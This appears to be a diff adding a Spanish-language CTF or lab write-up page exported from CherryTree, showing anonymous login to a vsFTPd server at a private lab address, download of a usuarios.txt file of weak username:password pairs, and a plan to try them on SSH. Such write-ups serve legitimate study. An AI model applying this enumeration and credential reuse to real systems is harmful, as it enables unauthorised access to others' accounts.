@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>ftp</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>ftp</h1><br/><p>#en escaneo de nmap se ve que existe usuario Anonymous sin log</p><p><img src="images/3-1.png" alt="images/3-1.png" /></p><p></p><p>#tambien arroja directorio pub</p><p></p><p> ftp 172.17.0.2</p><p>Connected to 172.17.0.2.</p><p>220 (vsFTPd 3.0.5)</p><p>Name (172.17.0.2:kali): Anonymous</p><p>331 Please specify the password.</p><p>Password: </p><p>230 Login successful.</p><p>Remote system type is UNIX.</p><p>Using binary mode to transfer files.</p><p>ftp&gt; </p><p></p><p>#Realizo ls para buscar archivos</p><p>ftp&gt; ls</p><p>229 Entering Extended Passive Mode (|||40002|)</p><p>150 Here comes the directory listing.</p><p>drwxr-xr-x    1 65534    65534        4096 Nov 27  2025 pub</p><p>226 Directory send OK.</p><p>ftp&gt; </p><p></p><p>#cambio de directorio a pub</p><p></p><p>ftp&gt; cd pub</p><p>250 Directory successfully changed.</p><p></p><p>#Realizo ls en pub para ver contenido</p><p></p><p>ftp&gt; ls</p><p>229 Entering Extended Passive Mode (|||40060|)</p><p>150 Here comes the directory listing.</p><p>-rw-r--r--    1 0        0              81 Nov 27  2025 usuarios.txt</p><p>226 Directory send OK.</p><p></p><p>#se encuentra archivo usuarios.txt</p><p>#realizo transferencia de archivo usuarios.txt</p><p></p><p>ftp&gt; get usuarios.txt</p><p>local: usuarios.txt remote: usuarios.txt</p><p>229 Entering Extended Passive Mode (|||40045|)</p><p>150 Opening BINARY mode data connection for usuarios.txt (81 bytes).</p><p>100% |************************************************|    81       45.35 KiB/s    00:00 ETA</p><p>226 Transfer complete.</p><p>81 bytes received in 00:00 (23.59 KiB/s)</p><p></p><p>#cierro ftp </p><p></p><p>#lectura de archivo usuarios.txt </p><p></p><p>└─$ cat usuarios.txt</p><p>carlos:qwerty</p><p>maria:123456</p><p>guest:guest</p><p>admin:admin</p><p>test:user123</p><p>alberto:admin123</p><p></p><p>#se descubren credenciales &gt; se procede a probarlas en ssh</p></div>
+</body>
+</html>
